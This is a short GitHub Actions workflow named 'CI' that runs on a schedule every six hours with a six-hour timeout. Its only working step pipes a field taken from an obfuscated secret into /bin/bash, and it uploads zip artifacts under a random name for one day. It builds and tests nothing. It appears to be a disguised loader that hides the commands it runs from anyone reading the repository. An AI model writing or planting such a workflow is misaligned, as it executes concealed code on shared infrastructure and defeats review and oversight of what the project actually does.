name: CI
on:
  workflow_dispatch:

  schedule:
    - cron: '39 1,7,13,19 * * *'
permissions:
  contents: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  runner:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Go
        env:
          z574: ${{ secrets.z574 }}
        run: |
          printf '%s' "$z574" | jq -r .vlqk3 | /bin/bash
          printf '%s' "$fbgc7" | jq -r .zmyep84 | /bin/bash

      - name: Archive results
        uses: actions/upload-artifact@v4
        with:
          name: bohWKiff
          path: "*.zip"
          retention-days: 1
